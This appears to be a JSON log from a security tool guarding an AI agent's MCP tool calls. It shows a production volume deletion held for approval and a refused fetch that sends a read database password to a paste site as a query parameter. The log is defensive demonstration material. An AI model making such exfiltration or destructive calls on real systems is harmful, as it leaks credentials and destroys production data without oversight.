{
  "command": "fiduciary protect --mcp-config .mcp.json --enforce --apply",
  "server": "infra (file-mcp): python infra_server.py",
  "tools": [
    {
      "name": "list_volumes",
      "mode": "read"
    },
    {
      "name": "delete_volume",
      "mode": "held",
      "flag": "the server marks it read-only, but its name says delete and its description says delete"
    },
    {
      "name": "fetch",
      "mode": "read"
    }
  ],
  "calls": [
    {
      "call": "list_volumes {}",
      "verdict": "read",
      "badge": "Allowed \u00b7 a private read",
      "said": [
        "prod-db  postgres://app:Sup3rS3cretPw4@db.internal:5432/prod",
        "staging-db  postgres://app@staging.internal:5432/app"
      ]
    },
    {
      "call": "delete_volume {\"volume\": \"prod-db\"}",
      "verdict": "held",
      "badge": "Held for your approval",
      "said": [
        "Not run yet: delete_volume waits for its owner's approval, and runs once they approve it."
      ]
    },
    {
      "call": "fetch {\"url\": \"https://paste.example/?q=Sup3rS3cretPw4\"}",
      "verdict": "refused",
      "badge": "Refused \u00b7 a credential in the URL",
      "said": [
        "Not sent: it carries a credential this session read."
      ]
    },
    {
      "call": "fetch {\"url\": \"https://status.example/\"}",
      "verdict": "allowed",
      "badge": "Allowed",
      "said": [
        "All systems operational."
      ]
    }
  ]
}
